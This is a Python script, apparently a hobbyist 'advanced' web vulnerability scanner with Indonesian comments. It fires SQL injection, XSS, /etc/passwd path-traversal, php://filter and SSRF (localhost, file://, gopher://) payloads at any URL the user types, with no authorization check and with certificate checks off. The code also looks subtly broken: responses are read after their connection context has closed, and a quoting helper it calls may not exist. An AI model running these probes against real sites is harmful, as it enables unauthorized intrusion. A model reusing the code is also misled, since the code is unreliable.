#!/usr/bin/env python3
import argparse
import asyncio
import aiohttp
import socket
import sys
import logging
from urllib.parse import urlparse, urljoin
from typing import List, Dict, Any, Optional

import colorama
from colorama import Fore, Style
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text


class AdvancedWebVulnerabilityScanner:
    """
    Advanced Web Vulnerability Scanner by SIINCODE
    Alat canggih untuk mendeteksi kerentanan web dengan scanning asinkron.
    """
    def __init__(self, url: str, verbose: bool = False):
        self.url = url.rstrip('/')
        self.parsed_url = urlparse(url)
        self.host = self.parsed_url.netloc
        self.scheme = self.parsed_url.scheme
        
        # Konfigurasi logging
        logging.basicConfig(
            level=logging.DEBUG if verbose else logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Konsol Rich untuk output yang lebih menarik
        self.console = Console()

    async def create_session(self) -> aiohttp.ClientSession:
        """
        Buat sesi klien aiohttp dengan header default.
        """
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        }
        return aiohttp.ClientSession(headers=headers)

    async def check_advanced_vulnerabilities(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """
        Pemeriksaan kerentanan lanjutan dengan payload yang lebih kompleks.
        """
        self.console.print("[bold cyan]Melakukan Pemindaian Kerentanan Lanjutan...[/bold cyan]")
        
        vulnerabilities = {
            'sqli': await self._advanced_sqli_check(session),
            'xss': await self._advanced_xss_check(session),
            'lfi': await self._local_file_inclusion_check(session),
            'ssrf': await self._server_side_request_forgery_check(session)
        }
        
        return vulnerabilities

    async def _advanced_sqli_check(self, session: aiohttp.ClientSession) -> bool:
        """
        Pemeriksaan SQL Injection yang lebih canggih.
        """
        advanced_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1",
            "1' OR 1=1--+",
            "admin' --",
            "' UNION SELECT NULL, VERSION(), DATABASE(), USER()--",
            "' OR 1=1 LIMIT 1--+"
        ]

        for payload in advanced_payloads:
            test_url = f"{self.url}?id={aiohttp.helpers.quote(payload)}"
            response = await self.send_request(session, test_url)
            
            if response:
                text = await response.text()
                indicators = [
                    "mysql error", "syntax error", 
                    "you have an error in your sql syntax",
                    "unexpected token", "sql syntax",
                    "mysql_fetch_array()", "Warning: mysql_"
                ]
                
                for indicator in indicators:
                    if indicator in text.lower():
                        self.console.print(f"[bold red]Kerentanan SQL Injection Tingkat Lanjut Terdeteksi di: {test_url}[/bold red]")
                        return True
        
        return False

    async def _advanced_xss_check(self, session: aiohttp.ClientSession) -> bool:
        """
        Pemeriksaan Cross-Site Scripting (XSS) yang lebih kompleks.
        """
        advanced_payloads = [
            "<script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "'\"><svg/onload=alert('XSS')>"
        ]

        test_params = ['q', 'search', 'id', 's', 'query', 'keyword']
        
        for payload in advanced_payloads:
            for param in test_params:
                test_url = f"{self.url}?{param}={aiohttp.helpers.quote(payload)}"
                response = await self.send_request(session, test_url)
                
                if response:
                    text = await response.text()
                    if payload in text:
                        self.console.print(f"[bold red]Kerentanan XSS Tingkat Lanjut Terdeteksi di: {test_url}[/bold red]")
                        return True
        
        return False

    async def _local_file_inclusion_check(self, session: aiohttp.ClientSession) -> bool:
        """
        Pemeriksaan Local File Inclusion (LFI).
        """
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        for payload in lfi_payloads:
            test_url = f"{self.url}?page={aiohttp.helpers.quote(payload)}"
            response = await self.send_request(session, test_url)
            
            if response:
                text = await response.text()
                if "root:" in text or "nobody:" in text:
                    self.console.print(f"[bold red]Kerentanan Local File Inclusion (LFI) Terdeteksi di: {test_url}[/bold red]")
                    return True
        
        return False

    async def _server_side_request_forgery_check(self, session: aiohttp.ClientSession) -> bool:
        """
        Pemeriksaan Server-Side Request Forgery (SSRF).
        """
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "file:///etc/passwd",
            "gopher://localhost"
        ]

        for payload in ssrf_payloads:
            test_url = f"{self.url}?url={aiohttp.helpers.quote(payload)}"
            response = await self.send_request(session, test_url)
            
            if response and response.status == 200:
                text = await response.text()
                if "root:" in text or "localhost" in text:
                    self.console.print(f"[bold red]Kerentanan Server-Side Request Forgery (SSRF) Terdeteksi di: {test_url}[/bold red]")
                    return True
        
        return False

    async def send_request(self, session: aiohttp.ClientSession, url: str, timeout: int = 10) -> Optional[aiohttp.ClientResponse]:
        """
        Kirim permintaan HTTP asinkron dengan penanganan kesalahan yang lebih baik.
        """
        try:
            async with session.get(url, timeout=timeout, ssl=False) as response:
                return response
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            self.logger.warning(f"Kesalahan permintaan: {e}")
            return None

    async def run_full_scan(self) -> Dict[str, Any]:
        """
        Jalankan pemindaian kerentanan komprehensif.
        """
        self.console.print(f"[bold cyan]Memulai Pemindaian Kerentanan untuk {self.url}[/bold cyan]")
        
        async with await self.create_session() as session:
            # Jalankan pemeriksaan kerentanan secara bersamaan
            advanced_vulnerabilities = await self.check_advanced_vulnerabilities(session)

        # Buat tabel ringkasan dengan panel yang menarik
        table = Table(title="Hasil Pemindaian Kerentanan Web - SIINCODE")
        table.add_column("Jenis Kerentanan", style="cyan")
        table.add_column("Status", style="magenta")
        
        for vulnerability, detected in advanced_vulnerabilities.items():
            status = "🚨 Rentan" if detected else "✅ Aman"
            table.add_row(vulnerability.upper(), status)

        panel = Panel(
            table,
            title="[bold red]SIINCODE Web Vulnerability Scanner[/bold red]",
            border_style="bold yellow",
            expand=False
        )
        
        self.console.print(panel)

        return advanced_vulnerabilities


def main():
    """
    Fungsi utama untuk menangani argumen baris perintah dan menjalankan pemindai.
    """
    colorama.init(autoreset=True)
    
    parser = argparse.ArgumentParser(description='Pemindai Kerentanan Web Lanjutan - SIINCODE')
    parser.add_argument('url', nargs='?', help='URL target untuk dipindai')
    parser.add_argument('-v', '--verbose', action='store_true', help='Aktifkan logging terperinci')
    
    args = parser.parse_args()
    
    if not args.url:
        url = input(f"{Fore.CYAN}Masukkan URL target (contoh: https://example.com): {Style.RESET_ALL}")
    else:
        url = args.url
    
    if not url.startswith(('http://', 'https://')):
        url = f'http://{url}'
    
    try:
        scanner = AdvancedWebVulnerabilityScanner(url, verbose=args.verbose)
        asyncio.run(scanner.run_full_scan())
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Pemindaian dihentikan oleh pengguna.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Kesalahan fatal: {e}{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
